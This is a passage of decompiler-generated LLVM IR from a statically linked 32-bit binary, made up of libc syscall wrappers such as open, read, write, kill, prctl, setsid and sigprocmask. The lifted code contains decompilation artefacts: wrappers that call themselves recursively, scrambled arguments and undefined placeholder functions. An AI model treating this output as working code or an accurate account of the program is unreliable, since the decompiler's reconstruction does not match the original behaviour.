  %v0_804d8c0 = load i32, i32* @esi, align 4
  store i32 %v0_804d8c0, i32* %stack_var_-44, align 4
  %v4_804d8c1 = inttoptr i32 %v0_804d8c0 to i32*
  %v5_804d8c1 = call i32 @realloc(i32* %v4_804d8c1, i32 %v2_804d899, i32 %v0_804d89b, i32 %v0_804d89b)
  %v1_804d8cb = icmp eq i32 %v5_804d8c1, 0
  %v1_804d8cd = icmp eq i1 %v1_804d8cb, false
  br i1 %v1_804d8cd, label %dec_label_pc_804d8e7, label %dec_label_pc_804d8cf

dec_label_pc_804d8cf:                             ; preds = %dec_label_pc_804d8bd, %dec_label_pc_804d8b9
  %v0_804d8cf = load i32, i32* @esi, align 4
  br label %dec_label_pc_804d8e7

dec_label_pc_804d8d3:                             ; preds = %dec_label_pc_804d8b1, %dec_label_pc_804d8a6
  %v0_804d8d3 = load i32, i32* @edi, align 4
  %v1_804d8d3 = icmp eq i32 %v0_804d8d3, 0
  %v1_804d8d5 = icmp eq i1 %v1_804d8d3, false
  br i1 %v1_804d8d5, label %dec_label_pc_804d8e5, label %dec_label_pc_804d8d7

dec_label_pc_804d8d7:                             ; preds = %dec_label_pc_804d8d3
  %v0_804d8da = load i32, i32* @esi, align 4
  store i32 %v0_804d8da, i32* %stack_var_-44, align 4
  %v1_804d8db = call i32 @free(i32 %v0_804d8da)
  %v0_804d8ea.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d8e7

dec_label_pc_804d8e5:                             ; preds = %dec_label_pc_804d8d3, %dec_label_pc_804d87c, %dec_label_pc_804d84f
  br label %dec_label_pc_804d8e7

dec_label_pc_804d8e7:                             ; preds = %dec_label_pc_804d8bd, %dec_label_pc_804d8b5, %dec_label_pc_804d8d7, %dec_label_pc_804d8cf, %dec_label_pc_804d8e5
  %v0_804d8ea = phi i32 [ %v5_804d8c1, %dec_label_pc_804d8bd ], [ %v0_804d8b5, %dec_label_pc_804d8b5 ], [ %v0_804d8ea.pre, %dec_label_pc_804d8d7 ], [ %v0_804d8cf, %dec_label_pc_804d8cf ], [ 0, %dec_label_pc_804d8e5 ]
  store i32 %v0_804d83b, i32* @ebx, align 4
  store i32 %v0_804d83a, i32* @esi, align 4
  store i32 %v0_804d839, i32* @edi, align 4
  store i32 %v0_804d838, i32* @ebp, align 4
  ret i32 %v0_804d8ea

; uselistorder directives
  uselistorder i32 %v2_804d899, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804d880, { 0, 2, 1 }
  uselistorder i32 %v0_804d87f, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 3, 4, 2, 0, 5, 1 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder i32 %arg1, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_804d8e7, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_804d87c, { 1, 2, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804d8f7 = ptrtoint i32* %stack_var_-8 to i32
  %v2_804d8fe = call i32 @getrlimit(i32 7, i32 %v2_804d8f7)
  store i32 256, i32* @edx, align 4
  %v2_804d90b = icmp slt i32 %v2_804d8fe, 0
  br i1 %v2_804d90b, label %dec_label_pc_804d913, label %dec_label_pc_804d90f

dec_label_pc_804d90f:                             ; preds = %entry
  %v3_804d90f = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804d90f, i32* @edx, align 4
  br label %dec_label_pc_804d913

dec_label_pc_804d913:                             ; preds = %entry, %dec_label_pc_804d90f
  %v0_804d913 = phi i32 [ 256, %entry ], [ %v3_804d90f, %dec_label_pc_804d90f ]
  ret i32 %v0_804d913

; uselistorder directives
  uselistorder label %dec_label_pc_804d913, { 1, 0 }
}

define i32 @__GI_getpagesize(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_804d91c = load i32, i32* @global_var_805fd50.188, align 16
  %v1_804d926 = icmp eq i32 %v0_804d91c, 0
  br i1 %v1_804d926, label %dec_label_pc_804d92c, label %dec_label_pc_804d92a

dec_label_pc_804d92a:                             ; preds = %entry
  br label %dec_label_pc_804d92c

dec_label_pc_804d92c:                             ; preds = %entry, %dec_label_pc_804d92a
  %storemerge = phi i32 [ %v0_804d91c, %dec_label_pc_804d92a ], [ 4096, %entry ]
  %v0_804d92c = phi i32 [ %v0_804d91c, %dec_label_pc_804d92a ], [ 4096, %entry ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_804d92c

; uselistorder directives
  uselistorder label %dec_label_pc_804d92c, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d930 = load i32, i32* @ebx, align 4
  store i32 %v0_804d930, i32* %stack_var_-4, align 4
  %v1_804d939 = call i32 @getpid(i32 %v0_804d930)
  store i32 %v1_804d939, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804d939, -4095
  br i1 %tmp6, label %dec_label_pc_804d950, label %dec_label_pc_804d944

dec_label_pc_804d944:                             ; preds = %entry
  %v0_804d944 = load i32, i32* %stack_var_-4, align 4
  %v1_804d944 = call i32 @__errno_location(i32 %v0_804d944)
  %v0_804d949 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d949 = sub i32 0, %v0_804d949
  %v2_804d94b = inttoptr i32 %v1_804d944 to i32*
  store i32 %v1_804d949, i32* %v2_804d94b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d950

dec_label_pc_804d950:                             ; preds = %entry, %dec_label_pc_804d944
  %v0_804d950 = phi i32 [ %v1_804d939, %entry ], [ -1, %dec_label_pc_804d944 ]
  %v2_804d954 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d954, i32* @ebx, align 4
  ret i32 %v0_804d950

; uselistorder directives
  uselistorder i32 %v1_804d939, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d950, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d958 = load i32, i32* @ebx, align 4
  store i32 %v0_804d958, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804d96b = call i32 @int80_syscall(i32 191)
  store i32 %v1_804d96b, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804d96b, -4095
  br i1 %tmp8, label %dec_label_pc_804d984, label %dec_label_pc_804d978

dec_label_pc_804d978:                             ; preds = %entry
  %v0_804d978 = load i32, i32* %stack_var_-4, align 4
  %v1_804d978 = call i32 @__errno_location(i32 %v0_804d978)
  %v0_804d97d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d97d = sub i32 0, %v0_804d97d
  %v2_804d97f = inttoptr i32 %v1_804d978 to i32*
  store i32 %v1_804d97d, i32* %v2_804d97f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d984

dec_label_pc_804d984:                             ; preds = %entry, %dec_label_pc_804d978
  %v0_804d984 = phi i32 [ %v1_804d96b, %entry ], [ -1, %dec_label_pc_804d978 ]
  %v2_804d988 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d988, i32* @ebx, align 4
  ret i32 %v0_804d984

; uselistorder directives
  uselistorder i32 %v1_804d96b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d984, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804d98c = load i32, i32* @edi, align 4
  store i32 %v0_804d98c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804d9a4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804d9ac = call i32 @ioctl(i32 %v0_804d9a4, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804d9a4, i32* @ebx, align 4
  store i32 %v3_804d9ac, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v3_804d9ac, -4095
  br i1 %tmp11, label %dec_label_pc_804d9c4, label %dec_label_pc_804d9b8

dec_label_pc_804d9b8:                             ; preds = %entry
  %v1_804d9b8 = call i32 @__errno_location(i32 %v0_804d9a4)
  %v0_804d9bd = load i32, i32* %edi.global-to-local, align 4
  %v1_804d9bd = sub i32 0, %v0_804d9bd
  %v2_804d9bf = inttoptr i32 %v1_804d9b8 to i32*
  store i32 %v1_804d9bd, i32* %v2_804d9bf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804d9c4

dec_label_pc_804d9c4:                             ; preds = %entry, %dec_label_pc_804d9b8
  %v0_804d9c4 = phi i32 [ %v3_804d9ac, %entry ], [ -1, %dec_label_pc_804d9b8 ]
  %v2_804d9c9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d9c9, i32* @edi, align 4
  ret i32 %v0_804d9c4

; uselistorder directives
  uselistorder i32 %v3_804d9ac, { 1, 0, 2 }
  uselistorder i32 %v0_804d9a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d9c4, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d9cc = load i32, i32* @ebx, align 4
  store i32 %v0_804d9cc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_804d9df = call i32 @kill(i32 %v0_804d9cc, i32 %tmp4)
  store i32 %v2_804d9df, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_804d9df, -4095
  br i1 %tmp8, label %dec_label_pc_804d9f8, label %dec_label_pc_804d9ec

dec_label_pc_804d9ec:                             ; preds = %entry
  %v0_804d9ec = load i32, i32* %stack_var_-4, align 4
  %v1_804d9ec = call i32 @__errno_location(i32 %v0_804d9ec)
  %v0_804d9f1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d9f1 = sub i32 0, %v0_804d9f1
  %v2_804d9f3 = inttoptr i32 %v1_804d9ec to i32*
  store i32 %v1_804d9f1, i32* %v2_804d9f3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d9f8

dec_label_pc_804d9f8:                             ; preds = %entry, %dec_label_pc_804d9ec
  %v0_804d9f8 = phi i32 [ %v2_804d9df, %entry ], [ -1, %dec_label_pc_804d9ec ]
  %v2_804d9fa = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d9fa, i32* @edx, align 4
  %v2_804d9fc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d9fc, i32* @ebx, align 4
  ret i32 %v0_804d9f8

; uselistorder directives
  uselistorder i32 %v2_804d9df, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d9f8, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_804da01 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804da07 = sdiv i32 %sext, 16777216
  store i32 %v4_804da07, i32* @ecx, align 4
  %v4_804da0b = ptrtoint i8* %arg1 to i32
  %v3_804da0f = and i32 %arg2, 64
  %v4_804da0f = icmp eq i32 %v3_804da0f, 0
  br i1 %v4_804da0f, label %dec_label_pc_804da20, label %dec_label_pc_804da14

dec_label_pc_804da14:                             ; preds = %entry
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_804da20

dec_label_pc_804da20:                             ; preds = %entry, %dec_label_pc_804da14
  %v0_804da20 = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_804da14 ]
  store i32 %v0_804da20, i32* @edx, align 4
  store i32 %v4_804da0b, i32* %ebx.global-to-local, align 4
  %v5_804da2b = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804da07)
  store i32 %v5_804da2b, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_804da2b, -4095
  br i1 %tmp15, label %dec_label_pc_804da43, label %dec_label_pc_804da37

dec_label_pc_804da37:                             ; preds = %dec_label_pc_804da20
  %v1_804da37 = call i32 @__errno_location(i32 %v0_804da01)
  %v0_804da3c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804da3c = sub i32 0, %v0_804da3c
  %v2_804da3e = inttoptr i32 %v1_804da37 to i32*
  store i32 %v1_804da3c, i32* %v2_804da3e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804da43

dec_label_pc_804da43:                             ; preds = %dec_label_pc_804da20, %dec_label_pc_804da37
  %v0_804da43 = phi i32 [ %v5_804da2b, %dec_label_pc_804da20 ], [ -1, %dec_label_pc_804da37 ]
  store i32 %v0_804da01, i32* @ebx, align 4
  ret i32 %v0_804da43

; uselistorder directives
  uselistorder i32 %v5_804da2b, { 1, 0, 2 }
  uselistorder i32 %v4_804da07, { 1, 0 }
  uselistorder i32 %v0_804da01, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804da43, { 1, 0 }
  uselistorder label %dec_label_pc_804da20, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804da5b = inttoptr i32 %arg1 to i8*
  %v4_804da5b = call i32 @__libc_open(i8* %v3_804da5b, i32 577)
  ret i32 %v4_804da5b
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804da64 = load i32, i32* @edi, align 4
  store i32 %v0_804da64, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804da6c = load i32, i32* @ebx, align 4
  %v1_804da74 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_804da74 = call i32 @pipe([2 x i32] %v1_804da74)
  store i32 %v0_804da6c, i32* @ebx, align 4
  store i32 %v2_804da74, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_804da74, -4095
  br i1 %tmp8, label %dec_label_pc_804da8c, label %dec_label_pc_804da80

dec_label_pc_804da80:                             ; preds = %entry
  %v1_804da80 = call i32 @__errno_location(i32 %v0_804da6c)
  %v0_804da85 = load i32, i32* %edi.global-to-local, align 4
  %v1_804da85 = sub i32 0, %v0_804da85
  %v2_804da87 = inttoptr i32 %v1_804da80 to i32*
  store i32 %v1_804da85, i32* %v2_804da87, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804da8c

dec_label_pc_804da8c:                             ; preds = %entry, %dec_label_pc_804da80
  %v0_804da8c = phi i32 [ %v2_804da74, %entry ], [ -1, %dec_label_pc_804da80 ]
  %v2_804da90 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804da90, i32* @edi, align 4
  ret i32 %v0_804da8c

; uselistorder directives
  uselistorder i32 %v2_804da74, { 1, 0, 2 }
  uselistorder i32 %v0_804da6c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804da8c, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804da94 = load i32, i32* @edi, align 4
  %v0_804da95 = load i32, i32* @esi, align 4
  store i32 %v0_804da95, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_804daad = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v5_804dab5 = call i32 @prctl(i32 %v0_804daad, i32 %v0_804da95, i32 %v0_804da94, i32 %tmp6, i32 %arg1)
  store i32 %v0_804daad, i32* @ebx, align 4
  store i32 %v5_804dab5, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v5_804dab5, -4095
  br i1 %tmp11, label %dec_label_pc_804dacd, label %dec_label_pc_804dac1

dec_label_pc_804dac1:                             ; preds = %entry
  %v1_804dac1 = call i32 @__errno_location(i32 %v0_804daad)
  %v0_804dac6 = load i32, i32* %esi.global-to-local, align 4
  %v1_804dac6 = sub i32 0, %v0_804dac6
  %v2_804dac8 = inttoptr i32 %v1_804dac1 to i32*
  store i32 %v1_804dac6, i32* %v2_804dac8, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804dacd

dec_label_pc_804dacd:                             ; preds = %entry, %dec_label_pc_804dac1
  %v0_804dacd = phi i32 [ %v5_804dab5, %entry ], [ -1, %dec_label_pc_804dac1 ]
  %v2_804dad0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804dad0, i32* @esi, align 4
  store i32 %v0_804da94, i32* @edi, align 4
  ret i32 %v0_804dacd

; uselistorder directives
  uselistorder i32 %v5_804dab5, { 1, 0, 2 }
  uselistorder i32 %v0_804daad, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @prctl, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804dacd, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dad4 = load i32, i32* @edi, align 4
  store i32 %v0_804dad4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804dae4 = load i32, i32* @ebx, align 4
  %v4_804daec = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804dae4, i32* @ebx, align 4
  store i32 %v4_804daec, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_804daec, -4095
  br i1 %tmp11, label %dec_label_pc_804db04, label %dec_label_pc_804daf8

dec_label_pc_804daf8:                             ; preds = %entry
  %v1_804daf8 = call i32 @__errno_location(i32 %v0_804dae4)
  %v0_804dafd = load i32, i32* %edi.global-to-local, align 4
  %v1_804dafd = sub i32 0, %v0_804dafd
  %v2_804daff = inttoptr i32 %v1_804daf8 to i32*
  store i32 %v1_804dafd, i32* %v2_804daff, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804db04

dec_label_pc_804db04:                             ; preds = %entry, %dec_label_pc_804daf8
  %v0_804db04 = phi i32 [ %v4_804daec, %entry ], [ -1, %dec_label_pc_804daf8 ]
  %v2_804db08 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804db08, i32* @edi, align 4
  ret i32 %v0_804db04

; uselistorder directives
  uselistorder i32 %v4_804daec, { 1, 0, 2 }
  uselistorder i32 %v0_804dae4, { 1, 0 }
  uselistorder label %dec_label_pc_804db04, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804db0d = load i32, i32* @esi, align 4
  store i32 %v0_804db0d, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804db25 = load i32, i32* @ebx, align 4
  %v1_804db2d = call i32 @int80_syscall(i32 142)
  store i32 %v0_804db25, i32* @ebx, align 4
  store i32 %v1_804db2d, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_804db2d, -4095
  br i1 %tmp11, label %dec_label_pc_804db45, label %dec_label_pc_804db39

dec_label_pc_804db39:                             ; preds = %entry
  %v1_804db39 = call i32 @__errno_location(i32 %v0_804db25)
  %v0_804db3e = load i32, i32* %esi.global-to-local, align 4
  %v1_804db3e = sub i32 0, %v0_804db3e
  %v2_804db40 = inttoptr i32 %v1_804db39 to i32*
  store i32 %v1_804db3e, i32* %v2_804db40, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804db45

dec_label_pc_804db45:                             ; preds = %entry, %dec_label_pc_804db39
  %v0_804db45 = phi i32 [ %v1_804db2d, %entry ], [ -1, %dec_label_pc_804db39 ]
  %v2_804db47 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804db47, i32* @edx, align 4
  %v2_804db48 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804db48, i32* @esi, align 4
  ret i32 %v0_804db45

; uselistorder directives
  uselistorder i32 %v1_804db2d, { 1, 0, 2 }
  uselistorder i32 %v0_804db25, { 1, 0 }
  uselistorder label %dec_label_pc_804db45, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804db4c = load i32, i32* @ebx, align 4
  store i32 %v0_804db4c, i32* %stack_var_-4, align 4
  %v1_804db55 = call i32 @setsid(i32 %v0_804db4c)
  store i32 %v1_804db55, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804db55, -4095
  br i1 %tmp6, label %dec_label_pc_804db6c, label %dec_label_pc_804db60

dec_label_pc_804db60:                             ; preds = %entry
  %v0_804db60 = load i32, i32* %stack_var_-4, align 4
  %v1_804db60 = call i32 @__errno_location(i32 %v0_804db60)
  %v0_804db65 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804db65 = sub i32 0, %v0_804db65
  %v2_804db67 = inttoptr i32 %v1_804db60 to i32*
  store i32 %v1_804db65, i32* %v2_804db67, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804db6c

dec_label_pc_804db6c:                             ; preds = %entry, %dec_label_pc_804db60
  %v0_804db6c = phi i32 [ %v1_804db55, %entry ], [ -1, %dec_label_pc_804db60 ]
  %v2_804db70 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804db70, i32* @ebx, align 4
  ret i32 %v0_804db6c

; uselistorder directives
  uselistorder i32 %v1_804db55, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804db6c, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_804db75 = load i32, i32* @esi, align 4
  %v4_804db79 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804db79, i32* @ecx, align 4
  %v2_804db85 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_804db85, label %dec_label_pc_804db9e, label %dec_label_pc_804db89

dec_label_pc_804db89:                             ; preds = %entry
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_804db9e, label %dec_label_pc_804db8e

dec_label_pc_804db8e:                             ; preds = %dec_label_pc_804db89
  %v1_804db8e = call i32 @__errno_location(i32 %v0_804db75)
  %v1_804db93 = inttoptr i32 %v1_804db8e to i32*
  store i32 22, i32* %v1_804db93, align 4
  br label %dec_label_pc_804dbc5

dec_label_pc_804db9e:                             ; preds = %dec_label_pc_804db89, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804dba3 = load i32, i32* @ebx, align 4
  %v7_804dbab = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_804dba3, i32* @ebx, align 4
  store i32 %v7_804dbab, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_804dbab, -4095
  br i1 %tmp12, label %dec_label_pc_804dbc5, label %dec_label_pc_804dbb7

dec_label_pc_804dbb7:                             ; preds = %dec_label_pc_804db9e
  %v1_804dbb7 = call i32 @__errno_location(i32 %v0_804dba3)
  %v0_804dbbc = load i32, i32* %esi.global-to-local, align 4
  %v1_804dbbc = sub i32 0, %v0_804dbbc
  %v2_804dbbe = inttoptr i32 %v1_804dbb7 to i32*
  store i32 %v1_804dbbc, i32* %v2_804dbbe, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804dbc5

dec_label_pc_804dbc5:                             ; preds = %dec_label_pc_804dbb7, %dec_label_pc_804db9e, %dec_label_pc_804db8e
  %storemerge = phi i32 [ -1, %dec_label_pc_804db8e ], [ %v7_804dbab, %dec_label_pc_804db9e ], [ -1, %dec_label_pc_804dbb7 ]
  %v2_804dbc5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dbc5, i32* @edx, align 4
  store i32 %v0_804db75, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_804dbab, { 1, 0, 2 }
  uselistorder i32 %v0_804dba3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dbcc = load i32, i32* @edi, align 4
  store i32 %v0_804dbcc, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_804dbd4 = load i32, i32* @ebx, align 4
  %v2_804dbdc = call i32 @time(i32* %arg1)
  store i32 %v0_804dbd4, i32* @ebx, align 4
  store i32 %v2_804dbdc, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_804dbdc, -4095
  br i1 %tmp9, label %dec_label_pc_804dbf4, label %dec_label_pc_804dbe8

dec_label_pc_804dbe8:                             ; preds = %entry
  %v1_804dbe8 = call i32 @__errno_location(i32 %v0_804dbd4)
  %v0_804dbed = load i32, i32* %edi.global-to-local, align 4
  %v1_804dbed = sub i32 0, %v0_804dbed
  %v2_804dbef = inttoptr i32 %v1_804dbe8 to i32*
  store i32 %v1_804dbed, i32* %v2_804dbef, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804dbf4

dec_label_pc_804dbf4:                             ; preds = %entry, %dec_label_pc_804dbe8
  %v0_804dbf4 = phi i32 [ %v2_804dbdc, %entry ], [ -1, %dec_label_pc_804dbe8 ]
  %v2_804dbf6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dbf6, i32* @edx, align 4
  %v2_804dbf8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dbf8, i32* @edi, align 4
  ret i32 %v0_804dbf4

; uselistorder directives
  uselistorder i32 %v2_804dbdc, { 1, 0, 2 }
  uselistorder i32 %v0_804dbd4, { 1, 0 }
  uselistorder label %dec_label_pc_804dbf4, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_804dc0d = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_804dc0d
}

define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dc18 = load i32, i32* @edi, align 4
  store i32 %v0_804dc18, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804dc28 = load i32, i32* @ebx, align 4
  %v4_804dc30 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804dc28, i32* @ebx, align 4
  store i32 %v4_804dc30, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_804dc30, -4095
  br i1 %tmp11, label %dec_label_pc_804dc48, label %dec_label_pc_804dc3c

dec_label_pc_804dc3c:                             ; preds = %entry
  %v1_804dc3c = call i32 @__errno_location(i32 %v0_804dc28)
  %v0_804dc41 = load i32, i32* %edi.global-to-local, align 4
  %v1_804dc41 = sub i32 0, %v0_804dc41
  %v2_804dc43 = inttoptr i32 %v1_804dc3c to i32*
  store i32 %v1_804dc41, i32* %v2_804dc43, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804dc48

dec_label_pc_804dc48:                             ; preds = %entry, %dec_label_pc_804dc3c
  %v0_804dc48 = phi i32 [ %v4_804dc30, %entry ], [ -1, %dec_label_pc_804dc3c ]
  %v2_804dc4a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dc4a, i32* @edx, align 4
  %v2_804dc4c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dc4c, i32* @edi, align 4
  ret i32 %v0_804dc48

; uselistorder directives
  uselistorder i32 %v4_804dc30, { 1, 0, 2 }
